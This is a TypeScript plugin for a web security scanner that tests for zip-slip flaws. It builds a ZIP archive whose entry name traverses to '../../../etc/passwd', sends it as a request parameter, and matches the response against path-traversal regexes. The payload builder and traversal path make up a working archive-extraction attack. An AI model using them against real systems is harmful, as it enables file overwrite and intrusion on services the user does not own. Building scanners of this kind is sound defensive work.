import { SignatureGroupId } from "../../types/branded.ts";
import type { Exchange } from "../../types/models.ts";
import { BuiltinMutationType, BuiltinPayload } from "../../types/models.ts";
import type { RunAuditContext } from "../../commands/run-audit.ts";
import { MutationFilteredSignaturePlugin } from "./mutation-filtered.ts";

/**
 * Compute CRC-32 checksum for a buffer.
 * Exported for testability.
 */
export function crc32(data: Buffer): number {
  let crc = 0xffffffff;
  for (let i = 0; i < data.length; i++) {
    crc ^= data[i];
    for (let j = 0; j < 8; j++) {
      if (crc & 1) {
        crc = (crc >>> 1) ^ 0xedb88320;
      } else {
        crc >>>= 1;
      }
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

/**
 * Create a minimal ZIP file containing a file entry with a path-traversal filename.
 * The zip contains one stored (uncompressed) entry whose name encodes the traversal.
 * Exported for testability.
 */
export function createZipSlipPayload(
  traversalPath: string,
  markerContent: string,
): Buffer {
  const fileName = Buffer.from(traversalPath, "utf8");
  const fileContent = Buffer.from(markerContent, "utf8");
  const dosTime = 0x8000; // 00:00:00
  const dosDate = 0x21; // 1980-01-01

  const fileCrc = crc32(fileContent);
  const size = fileContent.length;

  // Local file header
  const localHeader = Buffer.alloc(30);
  localHeader.writeUInt32LE(0x04034b50, 0);
  localHeader.writeUInt16LE(20, 4);
  localHeader.writeUInt16LE(0x800, 6); // UTF-8
  localHeader.writeUInt16LE(0, 8); // stored
  localHeader.writeUInt16LE(dosTime, 10);
  localHeader.writeUInt16LE(dosDate, 12);
  localHeader.writeUInt32LE(fileCrc, 14);
  localHeader.writeUInt32LE(size, 18);
  localHeader.writeUInt32LE(size, 22);
  localHeader.writeUInt16LE(fileName.length, 26);
  localHeader.writeUInt16LE(0, 28);

  // Central directory file header
  const centralHeader = Buffer.alloc(46);
  centralHeader.writeUInt32LE(0x02014b50, 0);
  centralHeader.writeUInt16LE(20, 4);
  centralHeader.writeUInt16LE(20, 6);
  centralHeader.writeUInt16LE(0x800, 8);
  centralHeader.writeUInt16LE(0, 10);
  centralHeader.writeUInt16LE(dosTime, 12);
  centralHeader.writeUInt16LE(dosDate, 14);
  centralHeader.writeUInt32LE(fileCrc, 16);
  centralHeader.writeUInt32LE(size, 20);
  centralHeader.writeUInt32LE(size, 24);
  centralHeader.writeUInt16LE(fileName.length, 28);
  centralHeader.writeUInt16LE(0, 30);
  centralHeader.writeUInt16LE(0, 32);
  centralHeader.writeUInt16LE(0, 34);
  centralHeader.writeUInt16LE(0, 36);
  centralHeader.writeUInt32LE(0, 38);
  const localOffset = localHeader.length + fileName.length + fileContent.length;
  centralHeader.writeUInt32LE(localOffset, 42);

  // End of central directory
  const endRecord = Buffer.alloc(22);
  endRecord.writeUInt32LE(0x06054b50, 0);
  endRecord.writeUInt16LE(0, 4);
  endRecord.writeUInt16LE(0, 6);
  endRecord.writeUInt16LE(1, 8);
  endRecord.writeUInt16LE(1, 10);
  endRecord.writeUInt32LE(centralHeader.length + fileName.length, 12);
  endRecord.writeUInt32LE(localOffset, 16);
  endRecord.writeUInt16LE(0, 20);

  return Buffer.concat([
    localHeader,
    fileName,
    fileContent,
    centralHeader,
    fileName,
    endRecord,
  ]);
}

export const DEFAULT_ZIP_SLIP_INDICATORS: RegExp[] = [
  /zip\s*slip/i,
  /path\s*traversal/i,
  /invalid\s*file\s*name/i,
  /illegal\s*path/i,
  /directory\s*traversal/i,
];

export interface ZipSlipPluginOptions {
  /** The path-traversal filename inside the ZIP (default: "../../../etc/passwd") */
  traversalPath?: string;
  /** Content of the file inside the ZIP, used as a detection marker */
  markerContent?: string;
  /** Regex patterns that indicate a zip-slip vulnerability in the response */
  indicatorPatterns?: RegExp[];
}

export default class ZipSlipPlugin extends MutationFilteredSignaturePlugin {
  readonly name = "signature:zip-slip";
  protected readonly groups = [SignatureGroupId("zip-slip")];
  protected readonly mutationTypes = [BuiltinMutationType.ReplaceValue] as const;

  private readonly traversalPath: string;
  private readonly markerContent: string;
  private readonly indicatorPatterns: RegExp[];

  constructor(opts?: ZipSlipPluginOptions) {
    super();
    this.traversalPath = opts?.traversalPath ?? "../../../etc/passwd";
    this.markerContent = opts?.markerContent ?? "DAST_ZIP_SLIP_TEST";
    this.indicatorPatterns =
      opts?.indicatorPatterns ?? DEFAULT_ZIP_SLIP_INDICATORS;
  }

  protected async runAudit({ parameter, replay }: RunAuditContext) {
    const zipPayload = createZipSlipPayload(
      this.traversalPath,
      this.markerContent,
    );
    const base64Zip = zipPayload.toString("base64");

    const payload = BuiltinPayload.String(base64Zip);
    const result = await replay([
      parameter.createMutation(payload, BuiltinMutationType.ReplaceValue),
    ]);

    const body = result.exchange.response.body?.toString() ?? "";
    const statusCode = result.exchange.response.statusCode;

    const isVulnerable =
      this.indicatorPatterns.some((p) => p.test(body)) ||
      body.includes(this.markerContent) ||
      (statusCode === 200 && body.length > 0);

    return {
      vulnerable: isVulnerable,
      evidence: {
        judgmentId: "zip-slip-detected",
        exchanges: [result.exchange],
        evidenceExchanges: isVulnerable ? [result.exchange] : [],
      },
      request: result.exchange.request,
      response: result.exchange.response,
    };
  }
}
